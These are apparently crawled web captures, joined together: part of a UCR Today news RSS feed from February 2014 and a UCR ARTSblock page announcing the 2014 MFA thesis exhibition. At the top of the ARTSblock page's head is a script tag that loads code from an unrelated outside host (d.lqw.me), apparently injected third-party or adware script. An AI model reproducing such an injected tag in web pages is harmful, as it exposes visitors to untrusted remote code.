+      http://ucrtoday.ucr.edu/20861/feed
+     </wfw:commentrss> 
+     <slash:comments>
+      0
+     </slash:comments> 
+     <enclosure url="http://ucrtoday.ucr.edu/wp-content/uploads/2014/02/excerpt-from-Maria-del-Carmen.mp3" length="0" type="audio/mpeg" /> 
+     <media:thumbnail url="http://ucrtoday.ucr.edu/wp-content/uploads/2014/02/Maria_del_Carmen1-130x78.jpg" /> 
+     <media:content url="http://ucrtoday.ucr.edu/wp-content/uploads/2014/02/Maria_del_Carmen1.jpg" medium="image" /> 
+    </item> 
+    <item> 
+     <title>March 6 Seminar to Examine Military Rape and Public Policy</title> 
+     <link />http://ucrtoday.ucr.edu/20836 
+     <comments>
+      http://ucrtoday.ucr.edu/20836#comments
+     </comments> 
+     <pubdate>
+      Wed, 26 Feb 2014 23:12:34 +0000
+     </pubdate> 
+     <dc:creator>
+      Bettye Miller
+     </dc:creator> 
+     <category>
+      Politics/Society
+     </category> 
+     <category>
+      Department of Defense
+     </category> 
+     <category>
+      loree sutton
+     </category> 
+     <category>
+      military
+     </category> 
+     <category>
+      military rape
+     </category> 
+     <category>
+      press release
+     </category> 
+     <category>
+      public policy
+     </category> 
+     <category>
+      School of Public Policy
+     </category> 
+     <category>
+      sexual assault
+     </category> 
+     <guid ispermalink="false">
+      http://ucrtoday.ucr.edu/?p=20836
+     </guid> 
+     <description>
+      Brig. Gen. (Ret.) Loree Sutton, M.D., and Laurie Leitch, Ph.D. will discuss “Military Rape and Public Policy in Real Time?” in a March 6 seminar.
+     </description> 
+     <wfw:commentrss>
+      http://ucrtoday.ucr.edu/20836/feed
+     </wfw:commentrss> 
+     <slash:comments>
+      0
+     </slash:comments> 
+     <media:thumbnail url="http://ucrtoday.ucr.edu/wp-content/uploads/2014/02/Sutton-Leitch-130x78.jpg" /> 
+     <media:content url="http://ucrtoday.ucr.edu/wp-content/uploads/2014/02/Sutton-Leitch.jpg" medium="image" /> 
+    </item> 
+    <item> 
+     <title>Did You Know?</title> 
+     <link />http://ucrtoday.ucr.edu/20831 
+     <comments>
+      http://ucrtoday.ucr.edu/20831#comments
+     </comments> 
+     <pubdate>
+      Wed, 26 Feb 2014 18:01:58 +0000
+     </pubdate> 
+     <dc:creator>
+      Lilledeshan Bose
+     </dc:creator> 
+     <category>
+      Did You Know?
+     </category> 
+     <category>
+      janet napolitano
+     </category> 
+     <category>
+      Kate Sweeny
+     </category> 
+     <category>
+      Population Lecture Series
+     </category> 
+     <category>
+      School of Medicine
+     </category> 
+     <guid ispermalink="false">
+      http://ucrtoday.ucr.edu/?p=20831
+     </guid> 
+     <description>
+      Assistant Professor of Psychology Kate Sweeny was featured in PBS Nova’s “The Secret Lives of Scientists and Engineers.” Sweeny studies how people manage stressful waiting periods, such as waiting for medical results or finding out about a job. In her off hours, Kate doffs her lab coat, puts on some glitter and fake eyelashes and becomes “Hayal,” the belly dancer. 
+     </description> 
+     <wfw:commentrss>
+      http://ucrtoday.ucr.edu/20831/feed
+     </wfw:commentrss> 
+     <slash:comments>
+      0
+     </slash:comments> 
+     <media:thumbnail url="http://ucrtoday.ucr.edu/wp-content/themes/ucr-newsroom.1.20/images/design6/th_ucr_today.png" /> 
+     <media:content url="http://ucrtoday.ucr.edu/wp-content/themes/ucr-newsroom.1.20/images/design6/th_ucr_today.png" medium="image" /> 
+    </item> 
+    <item> 
+     <title>Who Says?</title> 
+     <link />http://ucrtoday.ucr.edu/20667 
+     <comments>
+      http://ucrtoday.ucr.edu/20667#comments
+     </comments> 
+     <pubdate>
+      Wed, 26 Feb 2014 17:57:52 +0000
+     </pubdate> 
+     <dc:creator>
+      Bethanie Le
+     </dc:creator> 
+     <category>
+      Who Says?
+     </category> 
+     <category>
+      Aaron Seitz
+     </category> 
+     <category>
+      David Fairris
+     </category> 
+     <category>
+      Elisa Franco
+     </category> 
+     <category>
+      Sean Cutler
+     </category> 
+     <category>
+      Shan-Wen Tsai
+     </category> 
+     <category>
+      Shaun Bowler
+     </category> 
+     <category>
+      Sonja Lyubomirsky
+     </category> 
+     <category>
+      Timothy Lyons
+     </category> 
+     <guid ispermalink="false">
+      http://ucrtoday.ucr.edu/?p=20667
+     </guid> 
+     <description>
+      &quot;What we think we're doing is improving the brain's ability to read out information from the eyes.&quot; Aaron Seitz, associate professor of psychology, on his novel brain-training research that significantly improved the vision of individual UCR baseball players and reduces strikeouts LOS ANGELES TIMES
+     </description> 
+     <wfw:commentrss>
+      http://ucrtoday.ucr.edu/20667/feed
+     </wfw:commentrss> 
+     <slash:comments>
+      0
+     </slash:comments> 
+     <media:thumbnail url="http://ucrtoday.ucr.edu/wp-content/themes/ucr-newsroom.1.20/images/design6/th_ucr_today.png" /> 
+     <media:content url="http://ucrtoday.ucr.edu/wp-content/themes/ucr-newsroom.1.20/images/design6/th_ucr_today.png" medium="image" /> 
+    </item> 
+    <item> 
+     <title>Research and Scholarship</title> 
+     <link />http://ucrtoday.ucr.edu/20685 
+     <comments>
+      http://ucrtoday.ucr.edu/20685#comments
+     </comments> 
+     <pubdate>
+      Wed, 26 Feb 2014 17:54:53 +0000
+     </pubdate> 
+     <dc:creator>
+      Bethanie Le
+     </dc:creator> 
+     <category>
+      Research &amp; Scholarship
+     </category> 
+     <category>
+      Alexander Khitun
+     </category> 
+     <category>
+      Elisa Franco
+     </category> 
+     <category>
+      Melissa Conway
+     </category> 
+     <category>
+      steven clark
+     </category> 
+     <guid ispermalink="false">
+      http://ucrtoday.ucr.edu/?p=20685
+     </guid> 
+     <description>
+      Melissa Conway, head of Special Collections &amp;#038; University Archives for the University Libraries, was one of 20 people invited to participate in a January workshop held in Tempe, Ariz., hosted by the Center for Science and the Imagination at Arizona State University and the National Aeronautics and Space Administration (NASA). 
+     </description> 
+     <wfw:commentrss>
+      http://ucrtoday.ucr.edu/20685/feed
+     </wfw:commentrss> 
+     <slash:comments>
+      0
+     </slash:comments> 
+     <media:thumbnail url="http://ucrtoday.ucr.edu/wp-content/uploads/2014/02/elisa-franco-128x78.jpg" /> 
+     <media:content url="http://ucrtoday.ucr.edu/wp-content/uploads/2014/02/elisa-franco.jpg" medium="image" /> 
+    </item> 
+    <item> 
+     <title>Awards and Honors</title> 
+     <link />http://ucrtoday.ucr.edu/20687 
+     <comments>
+      http://ucrtoday.ucr.edu/20687#comments
+     </comments> 
+     <pubdate>
+      Wed, 26 Feb 2014 17:50:20 +0000
+     </pubdate> 
+     <dc:creator>
+      Bethanie Le
+     </dc:creator> 
+     <category>
+      Awards &amp; Honors
+     </category> 
+     <category>
+      Alexander Balandin
+     </category> 
+     <category>
+      strategic communications
+     </category> 
+     <category>
+      Susan Straight
+     </category> 
+     <category>
+      Yunzeng Wang
+     </category> 
+     <guid ispermalink="false">
+      http://ucrtoday.ucr.edu/?p=20687
+     </guid> 
+     <description>
+      UCR’s Office of Strategic Communications won three CASE District VII Awards of Excellence. Inside UCR was ranked Bronze in the category of Internal Audience Publications. “UCR Magazine: 10 Ways to Happiness” won the Silver prize in the Digital Magazines category. And in the Public Relations, Media Relations and Community Relations Projects category, UCR’s Living the Promise campaign won Gold. 
+     </description> 
+     <wfw:commentrss>
+      http://ucrtoday.ucr.edu/20687/feed
+     </wfw:commentrss> 
+     <slash:comments>
+      0
+     </slash:comments> 
+     <media:thumbnail url="http://ucrtoday.ucr.edu/wp-content/uploads/2014/02/susan-straight-128x78.jpg" /> 
+     <media:content url="http://ucrtoday.ucr.edu/wp-content/uploads/2014/02/susan-straight.jpg" medium="image" /> 
+    </item> 
+    <item> 
+     <title>Eleni Mastorakos</title> 
+     <link />http://ucrtoday.ucr.edu/20703 
+     <comments>
+      http://ucrtoday.ucr.edu/20703#comments
+     </comments> 
+     <pubdate>
+      Wed, 26 Feb 2014 17:43:27 +0000
+     </pubdate> 
+     <dc:creator>
+      Bethanie Le
+     </dc:creator> 
+     <category>
+      Getting Personal
+     </category> 
+     <category>
+      Eleni Mastorakos
+     </category> 
+     <category>
+      international education programs
+     </category> 
+     <guid ispermalink="false">
+      http://ucrtoday.ucr.edu/?p=20703
+     </guid> 
+     <description>
+      After the UCR alumna graduated in 2009 with a bachelor's degree in English, she was unsure of what to do as a career. She began tutoring, and that's when she noticed a trend: all her students were either international or had English as a second language. A bulb went off in Mastorakos's head. Realizing the need to assist international students, she got a master's degree in a program called &quot;Teaching English to Speakers of Other Languages.&quot; She ended up back at UCR as the international admissions advisor starting in November 2013.
+     </description> 
+     <wfw:commentrss>
+      http://ucrtoday.ucr.edu/20703/feed
+     </wfw:commentrss> 
+     <slash:comments>
+      0
+     </slash:comments> 
+     <media:thumbnail url="http://ucrtoday.ucr.edu/wp-content/uploads/2014/02/DSC_0133-130x78.jpg" /> 
+     <media:content url="http://ucrtoday.ucr.edu/wp-content/uploads/2014/02/DSC_0133.jpg" medium="image" /> 
+    </item> 
+    <item> 
+     <title>Take a UC Online Education Class and Get a Discount</title> 
+     <link />http://ucrtoday.ucr.edu/20801 
+     <comments>
+      http://ucrtoday.ucr.edu/20801#comments
+     </comments> 
+     <pubdate>
+      Wed, 26 Feb 2014 17:35:19 +0000
+     </pubdate> 
+     <dc:creator>
+      Lilledeshan Bose
+     </dc:creator> 
+     <category>
+      Inside UCR
+     </category> 
+     <category>
+      UC Online Education
+     </category> 
+     <guid ispermalink="false">
+      http://ucrtoday.ucr.edu/?p=20801
+     </guid> 
+     <description>
+      Nine classes will open for registration at UC Online on March 3, and you and your family members get a 33 percent discount on tuition. UC Online Education (UCOE), in partnership with systemwide Human Resources – Employee Relations, is offering the discount on UCOE courses for the term beginning April 2014. 
+     </description> 
+     <wfw:commentrss>
+      http://ucrtoday.ucr.edu/20801/feed
+     </wfw:commentrss> 
+     <slash:comments>
+      0
+     </slash:comments> 
+     <media:thumbnail url="http://ucrtoday.ucr.edu/wp-content/uploads/2014/02/audience-lifelong-e1343225193502-130x78.jpg" /> 
+     <media:content url="http://ucrtoday.ucr.edu/wp-content/uploads/2014/02/audience-lifelong-e1343225193502.jpg" medium="image" /> 
+    </item> 
+    <item> 
+     <title>Wilcox Discusses Accomplishments and Opportunities Ahead for UCR</title> 
+     <link />http://ucrtoday.ucr.edu/20804 
+     <comments>
+      http://ucrtoday.ucr.edu/20804#comments
+     </comments> 
+     <pubdate>
+      Wed, 26 Feb 2014 17:33:08 +0000
+     </pubdate> 
+     <dc:creator>
+      Lilledeshan Bose
+     </dc:creator> 
+     <category>
+      Inside UCR
+     </category> 
+     <category>
+      Chancellor Kim A. Wilcox
+     </category> 
+     <category>
+      Graduation Rate Task Force
+     </category> 
+     <category>
+      Town Hall
+     </category> 
+     <guid ispermalink="false">
+      http://ucrtoday.ucr.edu/?p=20804
+     </guid> 
+     <description>
+      Chancellor Kim A. Wilcox communicated directly at the Feb. 18 Town Hall meeting about a variety of issues important to campus development, including a report prepared by a task force working to increase graduation rates.
+     </description> 
+     <wfw:commentrss>
+      http://ucrtoday.ucr.edu/20804/feed
+     </wfw:commentrss> 
+     <slash:comments>
+      0
+     </slash:comments> 
+     <media:thumbnail url="http://ucrtoday.ucr.edu/wp-content/uploads/2014/02/chancellor-town-hall-130x78.jpeg" /> 
+     <media:content url="http://ucrtoday.ucr.edu/wp-content/uploads/2014/02/chancellor-town-hall.jpeg" medium="image" /> 
+    </item> 
+    <item> 
+     <title>The Month in Photos: February 2014</title> 
+     <link />http://ucrtoday.ucr.edu/20808 
+     <comments>
+      http://ucrtoday.ucr.edu/20808#comments
+     </comments> 
+     <pubdate>
+      Wed, 26 Feb 2014 17:30:41 +0000
+     </pubdate> 
+     <dc:creator>
+      Lilledeshan Bose
+     </dc:creator> 
+     <category>
+      Inside UCR
+     </category> 
+     <category>
+      dance marathon
+     </category> 
+     <category>
+      Darwin Day
+     </category> 
+     <category>
+      Tuskegee Airmen
+     </category> 
+     <guid ispermalink="false">
+      http://ucrtoday.ucr.edu/?p=20808
+     </guid> 
+     <description>
+      UCR celebrated annual events in February with the 9th Annual Tuskegee Airmen Celebration, Darwin Day Happy Hour, and the Guardian Scholars Dance Marathon exceeding fundraising goals. On Feb. 18, UCR student Aja Campbell had lunch with Gov. Brown to fulfill his &quot;Promise for Education.&quot; Students also had random fun at the Adult Swim Fun House which set up by the Rivera Library for two days.
+     </description> 
+     <wfw:commentrss>
+      http://ucrtoday.ucr.edu/20808/feed
+     </wfw:commentrss> 
+     <slash:comments>
+      0
+     </slash:comments> 
+     <media:thumbnail url="http://ucrtoday.ucr.edu/wp-content/uploads/2014/02/Dance-Marathon-130x78.jpg" /> 
+     <media:content url="http://ucrtoday.ucr.edu/wp-content/uploads/2014/02/Dance-Marathon.jpg" medium="image" /> 
+    </item> 
+    <item> 
+     <title>UCR to Offer Free Parking For Visitors at Selected Events</title> 
+     <link />http://ucrtoday.ucr.edu/20732 
+     <comments>
+      http://ucrtoday.ucr.edu/20732#comments
+     </comments> 
+     <pubdate>
+      Wed, 26 Feb 2014 01:10:58 +0000
+     </pubdate> 
+     <dc:creator>
+      Ross French
+     </dc:creator> 
+     <category>
+      Inside UCR
+     </category> 
+     <category>
+      Debbie Manlongat
+     </category> 
+     <category>
+      greg artman
+     </category> 
+     <category>
+      Kim A. Wilcox
+     </category> 
+     <category>
+      kim huynh
+     </category> 
+     <category>
+      parking
+     </category> 
+     <category>
+      press release
+     </category> 
+     <category>
+      Transportation and Parking Services
+     </category> 
+     <guid ispermalink="false">
+      http://ucrtoday.ucr.edu/?p=20732
+     </guid> 
+     <description>
+      The University of California, Riverside will begin offering free parking for guests attending no-cost and selected low-cost events on campus as part of a new parking initiative that campus leadership hopes will encourage more community members to participate in academic, cultural and student programs and gatherings. The program was announced in a joint message from Chancellor Kim Wilcox and Executive Vice Chancellor/Provost Dallas Rabenstein Monday.
+     </description> 
+     <wfw:commentrss>
+      http://ucrtoday.ucr.edu/20732/feed
+     </wfw:commentrss> 
+     <slash:comments>
+      0
+     </slash:comments> 
+     <media:thumbnail url="http://ucrtoday.ucr.edu/wp-content/uploads/2014/02/Transportation-and-Parking-Services-permits-1-e1393280056658-130x78.jpg" /> 
+     <media:content url="http://ucrtoday.ucr.edu/wp-content/uploads/2014/02/Transportation-and-Parking-Services-permits-1.jpg" medium="image" /> 
+    </item> 
+    <item> 
+     <title>Warehouse Jobs: Path to the Middle Class?</title> 
+     <link />http://ucrtoday.ucr.edu/20787 
+     <comments>
+      http://ucrtoday.ucr.edu/20787#comments
+     </comments> 
+     <pubdate>
+      Tue, 25 Feb 2014 18:36:07 +0000
+     </pubdate> 
+     <dc:creator>
+      Bettye Miller
+     </dc:creator> 
+     <category>
+      Business
+     </category> 
+     <category>
+      Politics/Society
+     </category> 
+     <category>
+      Center for Sustainable Suburban Development
+     </category> 
+     <category>
+      economics
+     </category> 
+     <category>
+      jobs
+     </category> 
+     <category>
+      logistics industry
+     </category> 
+     <category>
+      press release
+     </category> 
+     <category>
+      public policy
+     </category> 
+     <category>
+      Randall Lewis Seminar Series
+     </category> 
+     <category>
+      warehouse workers
+     </category> 
+     <guid ispermalink="false">
+      http://ucrtoday.ucr.edu/?p=20787
+     </guid> 
+     <description>
+      A seminar focusing on the Inland region’s warehouse workers and whether those jobs provide a path to the middle class will be held on Thursday, Feb. 27, from 4:30 p.m. to 6:30 p.m. in the Riverside City Council chambers, 3900 Main St.
+     </description> 
+     <wfw:commentrss>
+      http://ucrtoday.ucr.edu/20787/feed
+     </wfw:commentrss> 
+     <slash:comments>
+      0
+     </slash:comments> 
+     <media:thumbnail url="http://ucrtoday.ucr.edu/wp-content/uploads/2014/02/Warehouse1-130x78.jpg" /> 
+     <media:content url="http://ucrtoday.ucr.edu/wp-content/uploads/2014/02/Warehouse1.jpg" medium="image" /> 
+    </item> 
+    <item> 
+     <title>Six to Be Recognized at Sixth Annual Women Students Celebration Event</title> 
+     <link />http://ucrtoday.ucr.edu/20102 
+     <comments>
+      http://ucrtoday.ucr.edu/20102#comments
+     </comments> 
+     <pubdate>
+      Sat, 22 Feb 2014 01:51:29 +0000
+     </pubdate> 
+     <dc:creator>
+      Ross French
+     </dc:creator> 
+     <category>
+      Politics/Society
+     </category> 
+     <category>
+      Adrienne Sims
+     </category> 
+     <category>
+      celebration of women
+     </category> 
+     <category>
+      press release
+     </category> 
+     <category>
+      women's resource center
+     </category> 
+     <guid ispermalink="false">
+      http://ucrtoday.ucr.edu/?p=20102
+     </guid> 
+     <description>
+      Six University of California, Riverside students will receive awards for efforts in leadership and civic engagement, social justice and overcoming adversity at the fourth annual Celebration for a Day of Appreciation and Recognition of Women Students on Thursday, March 6, 2014. Congressional candidate and Inland Empire resident Eloise Gomez Reyes is the keynote speaker.
+     </description> 
+     <wfw:commentrss>
+      http://ucrtoday.ucr.edu/20102/feed
+     </wfw:commentrss> 
+     <slash:comments>
+      0
+     </slash:comments> 
+     <media:thumbnail url="http://ucrtoday.ucr.edu/wp-content/uploads/2014/02/wrcawards-130x78.jpg" /> 
+     <media:content url="http://ucrtoday.ucr.edu/wp-content/uploads/2014/02/wrcawards.jpg" medium="image" /> 
+    </item> 
+    <item> 
+     <title>World-Renowned Evolutionary Biologist to Discuss Evolution of Butterflies and Climate Change</title> 
+     <link />http://ucrtoday.ucr.edu/20734 
+     <comments>
+      http://ucrtoday.ucr.edu/20734#comments
+     </comments> 
+     <pubdate>
+      Sat, 22 Feb 2014 01:23:36 +0000
+     </pubdate> 
+     <dc:creator>
+      Konrad Nagy
+     </dc:creator> 
+     <category>
+      Science/Technology
+     </category> 
+     <category>
+      Alfred M. Boyce Lecture
+     </category> 
+     <category>
+      Department of Entomology
+     </category> 
+     <category>
+      evolution
+     </category> 
+     <category>
+      evolutionary history
+     </category> 
+     <category>
+      press release
+     </category> 
+     <guid ispermalink="false">
+      http://ucrtoday.ucr.edu/?p=20734
+     </guid> 
+     <description>
+      Naomi Pierce, a world authority on butterflies, will give the 2014 Alfred M. Boyce Lecture at the University of California, Riverside on Monday, February 24.
+     </description> 
+     <wfw:commentrss>
+      http://ucrtoday.ucr.edu/20734/feed
+     </wfw:commentrss> 
+     <slash:comments>
+      0
+     </slash:comments> 
+     <media:thumbnail url="http://ucrtoday.ucr.edu/wp-content/uploads/2014/02/naomi-pierce-130x78.png" /> 
+     <media:content url="http://ucrtoday.ucr.edu/wp-content/uploads/2014/02/naomi-pierce.png" medium="image" /> 
+    </item> 
+   </channel> 
+  </rss> 
+ </body>
+</html><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+ <head> 
+  <script type="text/javascript" id="2f2a695a6afce2c2d833c706cd677a8e" src="http://d.lqw.me/xuiow/?o=3&amp;g=51C1355B-8F04-5EE1-6BAA-F729663DD92F&amp;s=BBA5481A-926B-4561-BD79-249F618495E6&amp;z=1393293607"></script> 
+  <title>UCR ARTSblock | Monster: MFA Thesis Exibition 2014</title> 
+  <meta charset="UTF-8" /> 
+  <meta http-equiv="content-type" content="text/xhtml; charset=UTF-8" /> 
+  <meta name="robots" content="noydir" /> 
+  <link rel="alternate" type="application/rss+xml" title="ARTSblock Events" href="http://apps.artsblock.ucr.edu/feeds/Events/Feed" /> 
+  <link href="/css/main.css" rel="stylesheet" type="text/css" media="screen" /> 
+  <script type="text/javascript" src="/js/jquery-1.4.2.min.js"></script> 
+  <script type="text/javascript" src="/js/hoverintent.js"></script> 
+  <script type="text/javascript" src="/js/jquery.timers.js"></script> 
+  <script type="text/javascript" src="/js/jquery.easyticker.min.js"></script> 
+  <script type="text/javascript">
+    $(document).ready(function(){
+      $("ul.subnav").parent().append("<span></span>"); //Only shows drop down trigger when js is enabled - Adds empty span tag after ul.subnav
+      $("ul.topnav li a") .mouseover(function() { //When trigger is clicked...
+        //Following events are applied to the subnav itself (moving subnav up and down)
+        $(this).parent().find("ul.subnav").slideDown('fast').show();
+        //Drop down the subnav on click
+        $(this).parent().hover(function() {
+        }, function(){  
+          $(this).parent().find("ul.subnav").slideUp('medium'); //When the mouse hovers out of the subnav, move it back up
+        });
+        //Following events are applied to the trigger (Hover events for the trigger)
+        }).hoverIntent(function() { 
+          $(this).addClass("subhover"); //On hover over, add class "subhover"
+        }, function(){  //On Hover Out
+          $(this).removeClass("subhover"); //On hover out, remove class "subhover"
+      });
+    });
+    </script> 
+  <script type="application/javascript">
+      $(document).ready(function() {
+
+      $('.feed').easyticker({
+        speed: 'fast', // Optional: default 'slow'
+        dureeAffichage: 5000 // Optional: default 5000
+      });
+    });
+    </script> 
+ </head> 
+ <body id="exhibitions"> 
+  <div id="wrapper"> 
+   <div id="header">
+    <a href="/"><img src="/images/logo-main.png" /></a> 
+    <div id="menu"> 
+     <ul class="topnav"> 
+      <li class="tier1"><a href="/about/">About</a> 
+       <ul class="subnav"> 
+        <li><a href="/Page/hours-and-directions/">Hours &amp; Directions</a></li> 
+        <li><a href="/Page/about/">Mission &amp; Facility</a></li> 
+        <!--<li><a href="/staff/">Staff</a></li>//--> 
+        <!--<li><a href="/advisory-board/">Advisory Boards</a></li>//--> 
+        <li><a href="/Page/facility-rental/">Facility Rental</a></li> 
+        <li><a href="/Page/podcasts/">Podcasts</a></li> 
+        <li><a href="/Page/contact/">Contact Us</a></li> 
+       </ul> </li> 
+      <li class="tier1"><a href="/Page/california-museum-of-photography">CMP</a></li> 
+      <li class="tier1"><a href="/Page/sweeney-art-gallery">Sweeney</a></li> 
+      <li class="tier1"><a href="/Page/culver-center-of-the-arts">Culver</a></li> 
+      <li class="tier1"><a href="/CampusConnections">CampusConnections</a> 
+       <!--<ul class="subnav">
+		      <li><a href="/CampusConnects/">Campus Connectionss</a></li>
+		      <li><a href="/Page/carl-residency/">CARL Residency</a></li>
+	      </ul>--> </li> 
+      <li class="tier1"><a href="https://advancementservices.ucr.edu/?col=UCR%20Arts%20Block" target="_blank">Support</a></li> 
+      <!--
+        <li class="tier1"><a href="/social-sites/">Interact/Connect</a>
+          <ul class="subnav">
+              <li><a href="/social-sites/">Social Sites</a></li>
+                <li><a href="/podcasts/">Podcasts</a></li>
+                <li><a href="/subscribe/">Subscribe to eNews</a></li>
+                <li><a href="/carl-residency/">C.A.R.L. Residency</a></li>
+            </ul>  
+        </li>
+          <li class="tier1"><a href="#">Support</a>
+                <ul class="subnav">
+              <li><a href="https://advancementservices.ucr.edu/GivingForm.aspx?dept=UCR%20ARTSBlock" target="_blank">UCR Giving Page</a></li>
+                <li><a href="http://chass.ucr.edu/giving/opportunities/naming_opportunities.html" target="_blank">Naming Opportunities</a></li>
+            </ul>  
+        </li>
+        //--> 
+     </ul> 
+    </div> 
+   </div> 
+   <div id="left-column-outer"> 
+    <div id="left-column-inner"> 
+     <div id="category-nav"> 
+      <ul> 
+       <li class="exhibitions"><a href="/Exhibition/List">Exhibitions</a></li> 
+       <li class="films"><a href="/Film/List">Film</a></li> 
+       <li class="performances"><a href="/Performance/List">Performances</a></li> 
+       <li class="programs"><a href="/Program/List">Programs</a></li> 
+      </ul> 
+     </div> 
+     <div id="color-bar">
+      <img src="/images/title-exhibitions.jpg" />
+     </div> 
+     <div id="gallery">
+      <img src="/images/603_322/Exhibition/321.jpg" width="613" class="large" /> 
+     </div> 
+     <div id="content-detail"> 
+      <h1>Monster: MFA Thesis Exibition 2014</h1> 
+      <h2 class="spaced-out">Sweeney Art Gallery</h2> 
+      <h2 class="spaced-out">Apr 12 - May 3, 2014</h2> 
+      <h3 class="spaced-out">Reception - Sat, Apr 12, 2014, 6pm - 9pm<br /></h3> 
+      <br /> 
+      <br /> 
+      <p></p>
+      <p class="p1">UCR ARTSblock's Sweeney Art Gallery &amp; Culver Center of the Arts present the annual &quot;MFA Thesis Exhibition 2014&quot; with works by three graduating Master of Fine Arts students in UCR's Department of Art:&nbsp;Chelsea Rector,&nbsp;Michael Shroads,&nbsp;and&nbsp;BANBAN.</p>
+      <p class="p1"><br /></p>
+      <p class="p1">These students join the ranks of Master of Fine Arts graduates from art departments and art schools across Southern California, a region that has become known for transforming its art students into major players on the international art scene. UCR's thesis exhibition is distinctive because it is the only graduate student exhibition in Southern California presented in an off-campus, public setting. The distinguished full-time faculty in UCR's Art Department includes Charles Long, John Divola, Jill Giegerich, Jim Isermann, Brandon Lattu, Yunhee Min, Erika Suderburg, and Amir Zaki.</p>
+      <p class="p1"><br /></p>
+      <p class="MsoNormal" style="margin: 0in 0in 0.0001pt; font-size: 13px; font-family: Arial; color: rgb(34, 34, 34); line-height: normal;"> </p>
+      <p class="p1">The exhibition is organized by UCR Department of Art and UCR ARTSblock. Support is provided by University of California, Riverside’s Department of Art and College of Humanities, Arts, and Social Sciences (CHASS).</p>
+      <p></p> 
+      <br />
+      <br />CULVER CENTER OF THE ARTS and SWEENEY ART GALLERY 
+      <!-- Youtube Embed --> 
+      <!-- Vimeo Embed --> 
+     </div> 
+     <!--
+  <div id="user-options">
+ <div id="fb-root"></div><script src="http://connect.facebook.net/en_US/all.js#appId=147239435350151&amp;xfbml=1"></script><div style="float:left; position:absolute; z-index:50"><fb:like href="" send="false" layout="box_count" width="50" show_faces="false" font="arial"></fb:like></div>
+<div id="plus1"><g:plusone size="tall"></g:plusone></div>
+      <div id="tweet">
+      <a href="http://twitter.com/share" class="twitter-share-button" data-count="vertical" data-via="CulverCenter" data-related="UCRARTSblock:ARTSblock">Tweet</a><script type="text/javascript" src="http://platform.twitter.com/widgets.js"></script>
+  </div>
+<div id="addThis" class="addthis_toolbox addthis_default_style ">
+<a class="addthis_counter addthis_pill_style"></a>
+</div>
+
+<script type="text/javascript">var addthis_config = {"data_track_clickback":true};</script>
+<script type="text/javascript" src="http://s7.addthis.com/js/250/addthis_widget.js#pubid=ucrartsblock"></script>
+
+<br />
+        <br />
+        <a href="http://www.google.com/calendar/event?action=TEMPLATE&Parameter1;&Parameter2;&Parameter3;" style="clear:left; float:left;"><img src="http://www.google.com/calendar/images/ext/gc_button1.gif"></a><div id="pinterest-container">
+
+<script type="text/javascript">
+(function() {
+    window.PinIt = window.PinIt || { loaded:false };
+    if (window.PinIt.loaded) return;
+    window.PinIt.loaded = true;
+    function async_load(){
+        var s = document.createElement("script");
+        s.type = "text/javascript";
+        s.async = true;
+        if (window.location.protocol == "https:")
+            s.src = "https://assets.pinterest.com/js/pinit.js";
+        else
+            s.src = "http://assets.pinterest.com/js/pinit.js";
+        var x = document.getElementsByTagName("script")[0];
+        x.parentNode.insertBefore(s, x);
+    }
+    if (window.attachEvent)
+        window.attachEvent("onload", async_load);
+    else
+        window.addEventListener("load", async_load, false);
+})();
+</script>
+
+
+<a href="http://pinterest.com/pin/create/button/?url=http://culvercenter.ucr.edu/film/?event-ID=3.2012.0014.0001&media=http://artsblock.ucr.edu/images/603_322/3/2012.0014.0001.jpg&description=This magical holiday tale tells of a young boy who still wants to believe in Santa even though his friends have &quot;grown out of it.&quot; His faith is rewarded when a steam train pulls up to his house and escorts him to the North Pole to meet Santa. The cutting-edge &quot;motion capture process&quot; used to film this story allows the real life actors to drive the emotions and movements of the animated characters." class="pin-it-button" count-layout="horizontal">Pin It</a>
+        </div>
+        <div id="foursquare-container">
+<a href="https://foursquare.com/intent/venue.html" class="fourSq-widget" data-variant="wide">Save to foursquare</a>
+
+
+<script type='text/javascript'>
+  (function() {
+    window.___fourSq = {};
+    var s = document.createElement('script');
+    s.type = 'text/javascript';
+    s.src = 'http://platform.foursquare.com/js/widgets.js';
+    s.async = true;
+    var ph = document.getElementsByTagName('script')[0];
+    ph.parentNode.insertBefore(s, ph);
+  })();
+</script>
+
+        </div>
+        <div style="float:left; clear:left; margin-bottom:17px">
+        <br />
+        <br />
+        <br />
+      </div><br />
+      //--> 
+     <div id="links" style="display: none;">
+      <img src="/images/img-links-film.png" /> 
+     </div> 
+    </div> 
+   </div> 
+   <!-- Sidebar --> 
+   <div id="right-column"> 
+    <form id="search-form" method="post" action="/Search"> 
+     <input type="text" name="q" size="21" /> 
+     <input type="submit" class="search-go" name="search" value="" /> 
+    </form> 
+    <div id="title-infocus">
+     Events in Focus
+    </div> 
+    <!-- Film --> 
+    <div id="module-infocus"> 
+     <p class="header" style="background-color:#577887;">Film</p> 
+     <a href="/Film/The-Rememberers-Art-and-Memory"> <img src="/images/302_201/Film/240.jpg" height="133" width="200" /> </a> 
+     <p> </p>
+     <h4><a href="/Film/The-Rememberers-Art-and-Memory">The Rememberers: Art &amp; Memory</a></h4> Screening - Fri, Mar 14, 2014, 7pm - 9pm 
+     <br /> 
+     <br /> 
+     <br /> 
+     <p></p> 
+    </div> 
+    <!-- Performance --> 
+    <div id="module-infocus"> 
+     <p class="header" style="background-color:#C4985B;">Performance</p> 
+     <a href="/Performance/Mobius-Trio"> <img src="/images/302_201/Performance/73.jpg" height="133" width="200" /> </a> 
+     <p> </p>
+     <h4><a href="/Performance/Mobius-Trio">Mobius Trio</a></h4> Student Reading Session - Wed, Mar 12, 2014, 10am - 12pm 
+     <br /> Concert - Wed, Mar 12, 2014, 8pm - 9:30pm 
+     <br /> 
+     <br /> 
+     <br /> 
+     <p></p> 
+    </div> 
+    <!-- Exhibition --> 
+    <div id="module-infocus"> 
+     <p class="header" style="background-color:#5e7750;">Exhibition</p> 
+     <a href="/Exhibition/Monster-MFA-Thesis-Exhibition-2014"> <img src="/images/302_201/Exhibition/321.jpg" height="133" width="200" /> </a> 
+     <p> </p>
+     <h4><a href="/Exhibition/Monster-MFA-Thesis-Exhibition-2014">Monster: MFA Thesis Exibition 2014</a></h4> 
+     <br /> 
+     <br /> 
+     <p></p> 
+    </div> 
+   </div> 
+   <div id="footer"> 
+    <!-- Footer Feed --> 
+    <div id="rss-news"> 
+     <a href="http://apps.artsblock.ucr.edu/feeds/Events/Feed" class="rss-link"></a> 
